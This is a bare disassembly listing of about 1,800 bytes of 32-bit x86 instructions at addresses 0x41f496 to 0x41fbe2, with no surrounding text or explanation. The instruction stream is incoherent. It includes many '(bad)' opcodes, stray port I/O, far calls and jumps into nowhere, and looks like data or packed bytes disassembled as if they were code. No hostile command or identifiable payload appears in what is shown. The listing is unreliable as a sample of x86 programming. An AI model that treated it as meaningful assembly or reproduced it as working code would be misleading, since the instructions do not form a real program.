  41f496:	adc    eax,0x5f3b2bc6
  41f49b:	jne    0x41f427
  41f49d:	cmp    eax,0x6143b16a
  41f4a2:	popf   
  41f4a3:	fs push edi
  41f4a5:	fsubp  st(4),st
  41f4a7:	or     DWORD PTR [esi+ebp*8+0x35],0xffffff95
  41f4ac:	add    al,0x8e
  41f4ae:	sub    al,0xe0
  41f4b0:	leave  
  41f4b1:	sbb    ecx,DWORD PTR [eax]
  41f4b3:	(bad)  
  41f4b4:	imul   edi,ecx,0x55
  41f4b7:	call   0x2c4a:0x4617cd42
  41f4be:	jg     0x41f490
  41f4c0:	cwde   
  41f4c1:	in     al,0x8b
  41f4c3:	cmp    edi,edx
  41f4c5:	pop    edi
  41f4c6:	pop    ebx
  41f4c7:	mov    eax,DWORD PTR [ecx+ebx*1]
  41f4ca:	dec    esp
  41f4cb:	mov    esp,0xaca995de
  41f4d0:	in     al,0x3f
  41f4d2:	fisubr WORD PTR [ebx-0x2c20d149]
  41f4d8:	or     BYTE PTR ss:[ecx+eax*2-0x7f],dl
  41f4dd:	ret    
  41f4de:	push   esi
  41f4df:	add    cl,BYTE PTR [ebp+0x62]
  41f4e2:	mov    ecx,0xddd6a14
  41f4e7:	fimul  DWORD PTR [eax-0x5cfc804d]
  41f4ed:	test   DWORD PTR [ecx-0x37],ebx
  41f4f0:	ins    DWORD PTR es:[edi],dx
  41f4f1:	mov    ecx,0x267f1a7b
  41f4f6:	jge    0x2888f89c
  41f4fc:	jae    0x41f570
  41f4fe:	loopne 0x41f528
  41f500:	sti    
  41f501:	sbb    eax,0x67a864e5
  41f507:	das    
  41f508:	xor    dh,BYTE PTR [ecx+0x1f]
  41f50b:	mov    bl,0xe9
  41f50d:	push   ebp
  41f50e:	xor    eax,0x177b4a86
  41f513:	fldl2e 
  41f515:	lods   al,BYTE PTR ds:[esi]
  41f516:	xchg   edx,eax
  41f517:	xor    bl,ch
  41f519:	in     al,0xca
  41f51b:	enter  0x3728,0xbe
  41f51f:	in     eax,dx
  41f520:	int    0x6d
  41f522:	add    DWORD PTR [eax-0x2a],esp
  41f525:	in     al,0xad
  41f527:	repnz push 0x30
  41f52a:	mov    esp,DWORD PTR [ecx+0x10]
  41f52d:	out    0x55,al
  41f52f:	push   ds
  41f530:	(bad)
  41f533:	jg     0x41f4d8
  41f535:	pop    edi
  41f536:	(bad)  
  41f537:	cmp    BYTE PTR [edi],cl
  41f539:	cwde   
  41f53a:	fisttp WORD PTR [esi+0x5b3c2573]
  41f540:	out    0xac,al
  41f542:	jae    0x41f4f9
  41f544:	out    dx,eax
  41f545:	fdivr  st,st(5)
  41f547:	mov    ebx,0xd8ff708d
  41f54c:	in     eax,dx
  41f54d:	cld    
  41f54e:	jnp    0x41f5ca
  41f550:	sbb    BYTE PTR [esi+0x2796f2f7],bl
  41f556:	out    dx,al
  41f557:	jl     0x41f520
  41f559:	pop    si
  41f55b:	mov    edi,0xaada37d8
  41f560:	push   ebp
  41f561:	dec    edi
  41f562:	mov    edi,0x3b591eba
  41f567:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f568:	push   esp
  41f569:	inc    esp
  41f56a:	repnz out 0xb6,al
  41f56d:	adc    DWORD PTR [ebx],ecx
  41f56f:	and    eax,0x31054ca1
  41f574:	rcr    DWORD PTR [esi],cl
  41f576:	mov    dh,0x9a
  41f578:	jbe    0x41f5c0
  41f57a:	aam    0x81
  41f57c:	sbb    eax,0xa71bd41d
  41f581:	jno    0x41f5f3
  41f583:	out    0xe0,al
  41f585:	or     al,0xa4
  41f587:	lea    eax,[ebx-0x20fbb82b]
  41f58d:	inc    ebp
  41f58e:	mov    ds:0xf799ca08,al
  41f593:	xchg   BYTE PTR [edx],ah
  41f595:	push   esp
  41f596:	adc    al,0xfa
  41f598:	gs ds mov bl,0xac
  41f59c:	jo     0x41f569
  41f59e:	jnp    0x41f582
  41f5a0:	sbb    ebx,DWORD PTR [edx]
  41f5a2:	(bad)  
  41f5a4:	dec    ebp
  41f5a5:	sbb    bl,BYTE PTR [edx-0x3e]
  41f5a8:	inc    edi
  41f5a9:	xor    bh,BYTE PTR [eax+0x1dce10da]
  41f5af:	and    eax,0xd668452c
  41f5b4:	js     0x41f574
  41f5b6:	add    DWORD PTR [esi],ecx
  41f5b8:	cmp    DWORD PTR [ebp+0x5e503663],eax
  41f5be:	out    dx,eax
  41f5bf:	mov    edi,0x1dd9187a
  41f5c4:	sbb    DWORD PTR [edx+0x38e03619],eax
  41f5ca:	pop    es
  41f5cb:	cmp    ebx,esi
  41f5cd:	int    0x4a
  41f5cf:	sub    DWORD PTR [edx-0x7b],0xffffffb9
  41f5d3:	aaa    
  41f5d4:	mul    BYTE PTR [ebx+edx*4]
  41f5d7:	jo     0x41f5fb
  41f5d9:	cwde   
  41f5da:	xor    ecx,DWORD PTR [esi-0x8]
  41f5dd:	xchg   ecx,eax
  41f5de:	lods   eax,DWORD PTR ds:[esi]
  41f5df:	leave  
  41f5e0:	(bad)  
  41f5e1:	adc    BYTE PTR [edi-0xa],bh
  41f5e4:	sbb    al,0x52
  41f5e6:	call   DWORD PTR [edi-0x13]
  41f5e9:	cmp    cl,BYTE PTR [ebx+0x41890a1b]
  41f5ef:	pop    eax
  41f5f0:	push   esi
  41f5f1:	dec    ebx
  41f5f2:	dec    ebx
  41f5f3:	dec    ebx
  41f5f4:	xor    ebx,edx
  41f5f6:	daa    
  41f5f7:	xchg   eax,esp
  41f5f9:	pop    ds
  41f5fa:	jno    0x41f657
  41f5fc:	sar    BYTE PTR [ebx],cl
  41f5fe:	lahf   
  41f5ff:	(bad)  
  41f600:	pop    ebp
  41f601:	ja     0x41f5c2
  41f603:	jmp    0x41f65b
  41f605:	mov    ah,0xfe
  41f607:	add    al,0x85
  41f609:	fiadd  DWORD PTR [eax]
  41f60b:	xchg   edx,eax
  41f60c:	mov    eax,0xbf6b4ddb
  41f611:	sbb    DWORD PTR [edi-0x21126aa5],eax
  41f617:	mov    esi,0xd7625071
  41f61c:	sbb    ebx,esp
  41f61e:	ja     0x41f685
  41f620:	je     0x41f696
  41f622:	sub    BYTE PTR [esi+0x2c],dh
  41f625:	in     al,0xf6
  41f627:	int3   
  41f628:	dec    eax
  41f629:	xchg   ebp,ecx
  41f62b:	adc    DWORD PTR cs:[edx-0x49e20fe9],edi
  41f632:	pop    ds
  41f633:	xor    ecx,DWORD PTR [ebx+ebx*2+0x346e265d]
  41f63a:	ret    
  41f63b:	nop/reserved BYTE PTR [ecx]
  41f63e:	add    dh,ch
  41f640:	dec    edx
  41f641:	ins    DWORD PTR es:[edi],dx
  41f642:	sub    DWORD PTR [esp+ecx*4-0x32596c07],edi
  41f649:	jno    0x41f614
  41f64b:	sbb    ah,BYTE PTR [ecx+0xd]
  41f64e:	xchg   eax,esi
  41f650:	out    dx,al
  41f651:	mov    WORD PTR [eax-0x78b8a572],?
  41f657:	add    ch,bh
  41f659:	inc    edi
  41f65a:	jl     0x41f6bf
  41f65c:	xlat   BYTE PTR ds:[ebx]
  41f65d:	(bad)  
  41f65e:	jmp    0x41f5e0
  41f660:	fwait
  41f661:	add    bl,BYTE PTR [edi+0x62]
  41f664:	jmp    0x60a1:0xe5777039
  41f66b:	xchg   ebp,eax
  41f66c:	int3   
  41f66d:	stos   DWORD PTR es:[edi],eax
  41f66e:	push   edi
  41f66f:	push   ebx
  41f670:	ins    DWORD PTR es:[edi],dx
  41f671:	loope  0x41f6a3
  41f673:	cwde   
  41f674:	daa    
  41f675:	jg     0x41f6a2
  41f677:	ins    BYTE PTR es:[edi],dx
  41f678:	fbld   TBYTE PTR [esi+0x76]
  41f67b:	inc    ebx
  41f67c:	jmp    0xdb1dfa47
  41f681:	mov    al,0x90
  41f683:	cmp    BYTE PTR [esi],0x6f
  41f686:	pop    es
  41f687:	jbe    0x41f681
  41f689:	pop    ds
  41f68a:	push   esi
  41f68b:	xor    edi,0xa7917844
  41f691:	sbb    BYTE PTR [edi+0x29b7f296],ch
  41f697:	ss dec edi
  41f699:	out    0xb3,al
  41f69b:	test   al,0x62
  41f69d:	popf   
  41f69e:	mov    esp,0x62bfb7eb
  41f6a3:	jne    0x41f71a
  41f6a5:	fcmovnbe st,st(2)
  41f6a7:	and    BYTE PTR [eax+0x49],ch
  41f6aa:	or     al,0xe7
  41f6ac:	push   edx
  41f6ad:	pop    ecx
  41f6ae:	dec    ebx
  41f6af:	lahf   
  41f6b0:	sub    al,0xdc
  41f6b2:	retf   
  41f6b3:	fwait
  41f6b4:	jmp    0xca58:0xdf76b11a
  41f6bb:	rol    DWORD PTR [edx+0x8e3059b],1
  41f6c1:	jge    0x41f680
  41f6c3:	ja     0x41f6cd
  41f6c5:	add    eax,0x87811967
  41f6ca:	out    0x95,eax
  41f6cc:	xchg   edx,eax
  41f6cd:	clc    
  41f6ce:	adc    bl,BYTE PTR [esi]
  41f6d0:	imul   ecx,ebp,0x7d
  41f6d3:	mov    ebx,0x83a0c85f
  41f6d8:	or     edi,DWORD PTR [esi-0x6e]
  41f6db:	stos   BYTE PTR es:[edi],al
  41f6dc:	sub    al,0x27
  41f6de:	fs mov cl,0x2c
  41f6e1:	arpl   WORD PTR [ebp+0x3b3acffa],di
  41f6e7:	mov    ds:0xfb6cf7e6,al
  41f6ec:	je     0x41f69d
  41f6ee:	mov    bl,0x8d
  41f6f0:	hlt    
  41f6f1:	test   eax,0xaeeb2495
  41f6f6:	rol    cl,1
  41f6f8:	sub    dl,BYTE PTR [edx+0x62]
  41f6fb:	push   edx
  41f6fc:	xchg   edi,eax
  41f6fd:	lods   eax,DWORD PTR ds:[esi]
  41f6fe:	or     al,0x20
  41f700:	in     al,0x1d
  41f702:	int    0xea
  41f704:	push   esp
  41f705:	loop   0x41f6c2
  41f707:	lods   al,BYTE PTR ds:[esi]
  41f708:	stos   DWORD PTR es:[edi],eax
  41f709:	call   0x8fdfb57c
  41f70e:	jae    0x41f6a0
  41f710:	cmc    
  41f711:	leave  
  41f712:	push   edi
  41f713:	loope  0x41f761
  41f715:	xor    DWORD PTR [eax],esi
  41f717:	scas   al,BYTE PTR es:[edi]
  41f718:	inc    esi
  41f719:	mov    eax,ds:0xd0ba8273
  41f71e:	push   ecx
  41f71f:	inc    ebp
  41f720:	popf   
  41f721:	test   eax,0x69ebb290
  41f726:	adc    DWORD PTR [esi+edx*1],eax
  41f729:	sahf   
  41f72a:	inc    edi
  41f72b:	sub    DWORD PTR [edi-0x16],ecx
  41f72e:	mov    dl,0xca
  41f730:	loopne 0x41f6e7
  41f732:	das    
  41f733:	xchg   esi,eax
  41f734:	(bad)  [esi-0x1e]
  41f737:	outs   dx,BYTE PTR ds:[esi]
  41f738:	xchg   esp,eax
  41f739:	into   
  41f73a:	outs   dx,DWORD PTR ds:[esi]
  41f73b:	adc    DWORD PTR [edi],esi
  41f73d:	sbb    cl,bl
  41f73f:	je     0x41f734
  41f741:	and    ebx,ecx
  41f743:	push   edx
  41f744:	pop    ecx
  41f745:	pusha  
  41f746:	inc    esp
  41f747:	mov    ebx,0x4584f0f0
  41f74c:	in     al,0x1e
  41f74e:	pop    ecx
  41f74f:	pushf  
  41f750:	aaa    
  41f751:	ss (bad) 
  41f754:	inc    ebx
  41f755:	or     ch,BYTE PTR [ecx]
  41f757:	data16 xchg BYTE PTR [ebx+0x6a],dh
  41f75b:	inc    ebx
  41f75c:	and    eax,0x4b6eac0f
  41f761:	pop    ebx
  41f762:	retf   0x84b6
  41f765:	call   0xdc44:0xe5baf2e3
  41f76c:	xchg   ecx,eax
  41f76d:	in     al,0x84
  41f76f:	leave  
  41f770:	jp     0x41f788
  41f772:	inc    ecx
  41f773:	scas   eax,DWORD PTR es:[edi]
  41f774:	ds in  eax,dx
  41f776:	push   ds
  41f777:	cld    
  41f778:	sbb    edi,DWORD PTR [ebp+0x5a]
  41f77b:	xchg   ecx,eax
  41f77c:	scas   al,BYTE PTR es:[edi]
  41f77d:	sbb    al,0x27
  41f77f:	mov    edi,0x5b446f6e
  41f784:	nop
  41f785:	xchg   ecx,eax
  41f786:	dec    edx
  41f787:	push   esi
  41f788:	push   esi
  41f789:	push   0x89f5e670
  41f78e:	pop    edi
  41f78f:	loop   0x41f7d2
  41f791:	inc    edi
  41f792:	mov    WORD PTR [ebx],cs
  41f794:	stos   DWORD PTR es:[edi],eax
  41f795:	jnp    0x41f7a2
  41f797:	scas   al,BYTE PTR es:[edi]
  41f798:	retf   
  41f799:	and    BYTE PTR ds:0xdbae5932,ah
  41f79f:	sub    DWORD PTR [ebx],ebx
  41f7a1:	and    esp,esi
  41f7a3:	(bad)  
  41f7a4:	ret    0x66bd
  41f7a7:	mov    eax,ds:0x58bb8c8f
  41f7ac:	lea    ebp,[ebx-0x21]
  41f7af:	push   cx
  41f7b1:	jne    0x41f7da
  41f7b3:	js     0x41f7b5
  41f7b5:	stos   DWORD PTR es:[edi],eax
  41f7b6:	punpckldq mm1,DWORD PTR [ecx]
  41f7b9:	mov    eax,ds:0x63acf32b
  41f7be:	pop    eax
  41f7bf:	out    0xfb,eax
  41f7c1:	cmp    esi,esi
  41f7c3:	out    0xd1,al
  41f7c5:	in     eax,dx
  41f7c6:	out    0xba,al
  41f7c8:	dec    esi
  41f7c9:	test   eax,0x588fe644
  41f7ce:	scas   eax,DWORD PTR es:[edi]
  41f7cf:	ret    0x7cb6
  41f7d2:	add    eax,0x5ad2de0
  41f7d7:	shl    DWORD PTR [edi+0x5d90f2e8],1
  41f7dd:	inc    esp
  41f7de:	add    al,0x3
  41f7e0:	pop    ebx
  41f7e1:	mov    bh,0xeb
  41f7e3:	push   DWORD PTR [ebx-0x212b27ab]
  41f7e9:	mov    esi,0x1f4c3acb
  41f7ee:	lods   al,BYTE PTR ds:[esi]
  41f7ef:	pusha  
  41f7f0:	loope  0x41f79f
  41f7f2:	dec    ebp
  41f7f3:	enter  0x7df1,0x4b
  41f7f7:	int3   
  41f7f8:	bnd jne 0x41f78d
  41f7fb:	mov    ch,0x3b
  41f7fd:	pusha  
  41f7fe:	les    ebp,FWORD PTR [eax]
  41f800:	jmp    0x41f858
  41f802:	cmp    BYTE PTR [esi+eiz*1+0x5a],0x1e
  41f807:	pop    eax
  41f808:	enter  0xb8c4,0x8d
  41f80c:	sub    al,0xbf
  41f80e:	add    al,0x97
  41f810:	cmp    BYTE PTR [ecx],0x46
  41f813:	pop    ds
  41f814:	inc    edi
  41f815:	lock push ebp
  41f817:	dec    esp
  41f818:	mov    ecx,0x2de9dd64
  41f81d:	cld    
  41f81e:	mov    bh,BYTE PTR [eax-0x42dd405c]
  41f824:	hlt    
  41f825:	push   0x6796f49d
  41f82a:	dec    eax
  41f82b:	dec    edi
  41f82c:	push   ebx
  41f82d:	repnz pop es
  41f82f:	xor    eax,0x6a63e84d
  41f834:	jmp    0x41f81e
  41f836:	xchg   al,bh
  41f838:	iret   
  41f839:	mov    gs,eax
  41f83b:	and    eax,0x13aa9b0e
  41f840:	retf   0xc123
  41f843:	push   0xe
  41f845:	idiv   ebp
  41f847:	pop    ebp
  41f848:	pop    edx
  41f849:	xchg   ecx,eax
  41f84a:	pop    esi
  41f84b:	cmp    ch,BYTE PTR [ebx-0x4637a4db]
  41f851:	(bad)  
  41f852:	lds    esp,FWORD PTR [ecx]
  41f854:	fistp  DWORD PTR [edi+0x4d]
  41f857:	inc    ebx
  41f858:	sbb    edx,DWORD PTR [ebx+0xca1ba30]
  41f85e:	call   0x526e:0x1cb7f400
  41f865:	jle    0x41f88e
  41f867:	shl    BYTE PTR [eax+0x3b87530f],cl
  41f86d:	icebp  
  41f86e:	jno    0x41f84b
  41f870:	dec    ecx
  41f871:	scas   al,BYTE PTR es:[edi]
  41f872:	xchg   edi,eax
  41f873:	pop    eax
  41f874:	mov    bh,0x9d
  41f876:	xor    bl,BYTE PTR [ebp+0x1f]
  41f879:	test   BYTE PTR [eax],ah
  41f87b:	or     al,0x35
  41f87d:	jecxz  0x41f883
  41f87f:	pop    eax
  41f880:	aas    
  41f881:	out    0x50,eax
  41f883:	test   eax,0x4823fe24
  41f888:	jmp    0x876dc81b
  41f88d:	and    ah,ah
  41f88f:	das    
  41f890:	push   ss
  41f891:	inc    esp
  41f892:	int    0x1b
  41f894:	ins    BYTE PTR es:[edi],dx
  41f895:	jne    0x41f8bd
  41f897:	les    esi,FWORD PTR [esi+0x37]
  41f89a:	xor    DWORD PTR ds:0xb9f8b8bf,eax
  41f8a0:	xor    al,0xd7
  41f8a2:	aam    0x8e
  41f8a4:	and    al,0x2a
  41f8a6:	and    esi,esi
  41f8a8:	call   0x3f9c:0x73155abf
  41f8af:	add    eax,0x2c33fc66
  41f8b4:	xchg   BYTE PTR [ebp+0x28756d2b],cl
  41f8ba:	aam    0x83
  41f8bc:	mov    ch,0x30
  41f8be:	ss into 
  41f8c0:	in     al,0x5b
  41f8c2:	or     eax,0x392ffbb1
  41f8c7:	int    0x29
  41f8c9:	(bad)  
  41f8ca:	jmp    0x41f882
  41f8cc:	cld    
  41f8cd:	sub    al,0xd4
  41f8cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f8d0:	fld    DWORD PTR [ebp-0x41]
  41f8d3:	mov    esi,0xb17cfe79
  41f8d8:	fild   WORD PTR [edx-0x20d518dd]
  41f8de:	pop    edi
  41f8df:	and    BYTE PTR [ebx+0x76bd6598],dh
  41f8e5:	inc    edi
  41f8e6:	pop    esi
  41f8e7:	add    eax,0x858c688
  41f8ec:	mov    eax,ds:0xa48eee1
  41f8f1:	mov    al,ds:0x5c95e848
  41f8f6:	mov    al,0x68
  41f8f8:	xchg   dl,dh
  41f8fa:	xchg   esi,eax
  41f8fb:	inc    ebx
  41f8fc:	jbe    0x41f97b
  41f8fe:	push   edx
  41f8ff:	mov    esi,0x54d1e87b
  41f904:	pop    ebp
  41f905:	sbb    ch,BYTE PTR [edi]
  41f907:	mov    bh,bl
  41f909:	jl     0x41f8fd
  41f90b:	mov    al,ds:0x1897c70d
  41f910:	loop   0x41f8bb
  41f912:	sub    bh,cl
  41f914:	xor    eax,0x4fda9567
  41f919:	jmp    0x45a75bc5
  41f91e:	scas   eax,DWORD PTR es:[edi]
  41f91f:	gs pop edi
  41f921:	push   esi
  41f922:	pop    ds
  41f923:	cmp    edi,esi
  41f925:	out    dx,al
  41f926:	dec    ebp
  41f927:	and    al,0xd8
  41f929:	dec    eax
  41f92a:	mov    DWORD PTR [eax+ebp*2-0x55],ecx
  41f92e:	sub    ecx,edx
  41f930:	data16 ja 0x41f8d7
  41f933:	cmp    DWORD PTR [ebx],esi
  41f935:	or     al,0xde
  41f937:	pop    ebp
  41f938:	gs scas eax,DWORD PTR es:[edi]
  41f93a:	xor    DWORD PTR [ebx],ebp
  41f93c:	push   0xffffffee
  41f93e:	mov    ah,0x49
  41f940:	cmc    
  41f941:	aad    0xd3
  41f943:	sub    BYTE PTR [edi-0x5],0xbc
  41f947:	push   esi
  41f948:	stos   BYTE PTR es:[edi],al
  41f949:	jo     0x41f9b1
  41f94b:	mov    eax,0xe3508c
  41f950:	dec    ebp
  41f951:	xchg   ecx,eax
  41f952:	mov    ebx,DWORD PTR [eax]
  41f954:	stc    
  41f955:	in     al,0xb6
  41f957:	dec    eax
  41f958:	aad    0x1d
  41f95a:	fist   DWORD PTR [eax+0x44d9b6e1]
  41f960:	call   0xe2f7:0xcd80d4f5
  41f967:	jnp    0x41f9b1
  41f969:	enter  0xb2a5,0x9d
  41f96d:	push   cs
  41f96e:	add    ebx,edx
  41f970:	jmp    0x998168e8
  41f975:	pop    ebx
  41f976:	ret    0x7a55
  41f979:	fstp   st(3)
  41f97b:	mov    ebx,0x810f0383
  41f980:	sbb    DWORD PTR [ebp+0x38],edi
  41f983:	push   ebp
  41f984:	cdq    
  41f985:	mov    dh,0xb2
  41f987:	or     dl,0xe2
  41f98a:	div    cl
  41f98c:	stos   BYTE PTR es:[edi],al
  41f98d:	aad    0xa5
  41f98f:	sbb    bh,BYTE PTR [ebx+0x43]
  41f992:	loope  0x41f9a4
  41f994:	ss ret 
  41f996:	out    0xb6,al
  41f998:	(bad)  
  41f999:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f99a:	xchg   ebx,eax
  41f99b:	cs stos DWORD PTR es:[edi],eax
  41f99d:	cmp    BYTE PTR [edx-0x4357ad23],ah
  41f9a3:	rol    esi,0x91
  41f9a6:	std    
  41f9a7:	inc    ebp
  41f9a8:	mov    ebx,0xfec59724
  41f9ad:	dec    ecx
  41f9ae:	xchg   esp,eax
  41f9af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f9b0:	test   ah,ah
  41f9b2:	push   ds
  41f9b3:	mov    ebx,0x89e1d534
  41f9b8:	jb     0x41f9e6
  41f9ba:	scas   eax,DWORD PTR es:[edi]
  41f9bb:	clc    
  41f9bc:	mov    ah,0x1f
  41f9be:	call   0x8a910400
  41f9c3:	dec    ebp
  41f9c4:	and    ebx,DWORD PTR [ebx-0x3]
  41f9c7:	add    al,0x63
  41f9c9:	mov    fs,eax
  41f9cb:	fcmovne st,st(5)
  41f9cd:	push   ss
  41f9ce:	cmp    DWORD PTR [eax+0x4b66ab5f],edx
  41f9d4:	leave  
  41f9d5:	clc    
  41f9d6:	les    ebx,FWORD PTR [ebx+0x57]
  41f9d9:	mov    BYTE PTR [ebp-0x730fb633],ah
  41f9df:	std    
  41f9e0:	icebp  
  41f9e1:	sub    DWORD PTR ss:[ebx-0x2fbdaded],esi
  41f9e8:	lods   al,BYTE PTR ds:[esi]
  41f9e9:	mov    edi,0xd927e70e
  41f9ee:	add    DWORD PTR [esi-0x1d422376],0xf00a7338
  41f9f8:	jnp    0x41fa3d
  41f9fa:	adc    dl,BYTE PTR [ebx+0x49]
  41f9fd:	and    edx,DWORD PTR ds:0x6fd7c7e4
  41fa03:	out    0x93,eax
  41fa05:	jbe    0x41fa76
  41fa07:	push   ebp
  41fa08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa09:	mov    dl,0x82
  41fa0b:	dec    ebx
  41fa0c:	and    eax,0x7147e3c8
  41fa11:	push   es
  41fa12:	jg     0x41fa79
  41fa14:	les    ebx,FWORD PTR [ecx+0x6c]
  41fa17:	js     0x41fa4d
  41fa19:	out    dx,al
  41fa1a:	xchg   ecx,eax
  41fa1b:	dec    ah
  41fa1d:	js     0x41fa38
  41fa1f:	stc    
  41fa20:	lock scas eax,DWORD PTR es:[edi]
  41fa22:	iret   
  41fa23:	xchg   ebx,eax
  41fa24:	out    0xc3,al
  41fa26:	cmp    bl,BYTE PTR [esi]
  41fa28:	and    BYTE PTR [ecx],bl
  41fa2a:	aaa    
  41fa2b:	xor    eax,0xbe009ec6
  41fa30:	xchg   edx,eax
  41fa31:	jmp    0x41fa7e
  41fa33:	scas   eax,DWORD PTR es:[edi]
  41fa34:	dec    edi
  41fa35:	dec    esp
  41fa36:	push   esp
  41fa37:	jmp    0x5479fd7
  41fa3c:	mov    ebx,DWORD PTR [esi-0x7a]
  41fa3f:	aad    0x68
  41fa41:	sub    dh,dh
  41fa43:	pop    ss
  41fa44:	mov    dl,0xc0
  41fa46:	xchg   edx,eax
  41fa47:	pop    ds
  41fa48:	mov    ds:0xb7a1eaa4,al
  41fa4d:	loope  0x41fa2f
  41fa4f:	cmp    al,dh
  41fa51:	pop    ds
  41fa52:	ret    0xeab9
  41fa55:	or     DWORD PTR [ebx],0xffffff96
  41fa58:	ja     0x41fa57
  41fa5a:	into   
  41fa5b:	push   ecx
  41fa5c:	iret   
  41fa5d:	loopne 0x41fa89
  41fa5f:	xchg   ecx,eax
  41fa60:	ror    BYTE PTR [ebx-0x4ece3cc1],cl
  41fa66:	jge    0x41fa26
  41fa68:	cmp    esi,edx
  41fa6a:	mov    esp,0x27867d2f
  41fa6f:	sub    ecx,DWORD PTR [edi]
  41fa71:	bound  ebx,QWORD PTR [esi-0x7e]
  41fa74:	jmp    0x41fa54
  41fa76:	jns    0x41fa96
  41fa78:	sbb    eax,0x40341329
  41fa7d:	outs   dx,BYTE PTR ds:[esi]
  41fa7e:	js     0x41fa51
  41fa80:	jbe    0x41fad2
  41fa82:	arpl   WORD PTR [ebx-0x6b],sp
  41fa85:	pop    edi
  41fa86:	imul   edx,DWORD PTR [esi],0xf3b00c3a
  41fa8c:	mov    ch,0xbf
  41fa8e:	add    al,0x33
  41fa90:	push   esp
  41fa91:	mov    edi,0xb7f338b8
  41fa96:	es or  al,0x56
  41fa99:	(bad)  
  41fa9a:	lock jmp 0x41fb13
  41fa9d:	sbb    DWORD PTR [ecx],edx
  41fa9f:	lahf   
  41faa0:	ret    0xee95
  41faa3:	or     dl,cl
  41faa5:	cs arpl di,bp
  41faa8:	dec    edx
  41faa9:	loope  0x41fa2c
  41faab:	outs   dx,BYTE PTR ds:[esi]
  41faac:	out    0x93,al
  41faae:	imul   ecx,DWORD PTR [edx-0x54],0xad0c31f1
  41fab5:	sar    DWORD PTR [esi+eiz*2+0x5b],cl
  41fab9:	push   edi
  41faba:	(bad)  
  41fabb:	xchg   ebp,eax
  41fabc:	ret    
  41fabd:	dec    esp
  41fabe:	ins    BYTE PTR es:[edi],dx
  41fabf:	in     al,0x65
  41fac1:	icebp  
  41fac2:	push   es
  41fac3:	fstp   TBYTE PTR [eax]
  41fac5:	xchg   ebp,eax
  41fac6:	mov    al,0xa0
  41fac8:	pusha  
  41fac9:	loopne 0x41fac5
  41facb:	xchg   edx,eax
  41facc:	xor    al,0x86
  41face:	jae    0x41fa9b
  41fad0:	sub    eax,0x637ad498
  41fad5:	call   0xd1fe:0xcb882acc
  41fadc:	jb     0x41fb09
  41fade:	lea    ecx,[edi-0x1]
  41fae1:	push   ss
  41fae2:	into   
  41fae3:	fsub   QWORD PTR [edi-0x7f]
  41fae6:	imul   cl
  41fae8:	lahf   
  41fae9:	xchg   esp,eax
  41faea:	mov    gs,edx
  41faec:	(bad)  
  41faed:	adc    bh,al
  41faef:	adc    eax,0x456296b2
  41faf4:	xchg   BYTE PTR [eax+0x22b6a983],al
  41fafa:	rol    BYTE PTR [ebp+eax*2-0x74e8d0f8],1
  41fb01:	ret    0xb57b
  41fb04:	mov    al,0xae
  41fb06:	push   es
  41fb07:	(bad)  
  41fb08:	std    
  41fb09:	mov    al,0x60
  41fb0b:	add    bh,BYTE PTR [edi-0x2e4d0bf5]
  41fb11:	jg     0x41fb5c
  41fb13:	rol    al,1
  41fb15:	adc    DWORD PTR [edx+0x111e7a76],esp
  41fb1b:	jns    0x41facc
  41fb1d:	arpl   WORD PTR [ebp-0x7a10640],bp
  41fb23:	icebp  
  41fb24:	cs cli 
  41fb26:	js     0x41fae8
  41fb28:	pop    es
  41fb29:	and    al,dl
  41fb2b:	(bad)  
  41fb2c:	sar    DWORD PTR [eax],0x51
  41fb2f:	xlat   BYTE PTR ds:[ebx]
  41fb30:	idiv   ch
  41fb32:	ret    0x16cc
  41fb35:	and    BYTE PTR [ebp+esi*4-0x2d],ah
  41fb39:	mov    edx,0xf16c562b
  41fb3e:	iret   
  41fb3f:	jmp    0xcb8a:0xf5a15f53
  41fb46:	lods   al,BYTE PTR ds:[esi]
  41fb47:	ds stos DWORD PTR es:[edi],eax
  41fb49:	or     al,0xca
  41fb4b:	pop    es
  41fb4c:	(bad)  
  41fb4d:	xchg   BYTE PTR [ebp+edi*8+0x58],ch
  41fb51:	scas   al,BYTE PTR es:[edi]
  41fb52:	adc    eax,0xa800b8f6
  41fb57:	aad    0xc4
  41fb59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fb5a:	mov    ch,0x34
  41fb5c:	fcomp  QWORD PTR [ecx+0x304e5088]
  41fb62:	pop    edi
  41fb63:	cmp    ecx,esi
  41fb65:	mov    ebx,0x7b2878c9
  41fb6a:	push   esi
  41fb6b:	aad    0x8b
  41fb6d:	lea    ebp,[eax-0x76492161]
  41fb73:	jae    0x41fb88
  41fb75:	mov    eax,ds:0xd79c3fef
  41fb7a:	xchg   ecx,eax
  41fb7b:	xor    BYTE PTR [edi+esi*8-0x5a105fca],bl
  41fb82:	leave  
  41fb83:	retf   
  41fb84:	addr16 jp 0x41fbd0
  41fb87:	(bad)  
  41fb88:	test   DWORD PTR [ebx+0x524fb54f],edi
  41fb8e:	inc    ebp
  41fb8f:	mov    al,0x9b
  41fb91:	dec    edx
  41fb92:	inc    ecx
  41fb93:	add    DWORD PTR [ecx+0x225953ec],edi
  41fb99:	ds test cl,cl
  41fb9c:	jnp    0x41fbc3
  41fb9e:	mov    eax,ds:0x29ca8da4
  41fba3:	data16 or al,0x62
  41fba6:	jo     0x41fbb0
  41fba8:	jmp    0x274b82
  41fbad:	clc    
  41fbae:	mov    dh,0x57
  41fbb0:	push   ss
  41fbb1:	pop    ecx
  41fbb2:	das    
  41fbb3:	loopne 0x41fb61
  41fbb5:	ss (bad) 
  41fbb7:	pop    ss
  41fbb8:	fld    QWORD PTR [edx]
  41fbba:	lods   eax,DWORD PTR ds:[esi]
  41fbbb:	gs clc 
  41fbbd:	inc    esi
  41fbbe:	icebp  
  41fbbf:	and    al,0x3b
  41fbc1:	bound  esp,QWORD PTR [ebx-0x7b898b]
  41fbc7:	repz mov esp,DWORD PTR [eax-0x24]
  41fbcb:	dec    ebx
  41fbcc:	lahf   
  41fbcd:	es adc cl,dl
  41fbd0:	arpl   di,dx
  41fbd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fbd3:	dec    ecx
  41fbd4:	jmp    0xf6:0x91337062
  41fbdb:	sub    al,0xc5
  41fbdd:	scas   al,BYTE PTR es:[edi]
  41fbde:	in     al,0xfd
  41fbe0:	and    esp,esi
  41fbe2:	inc    esp
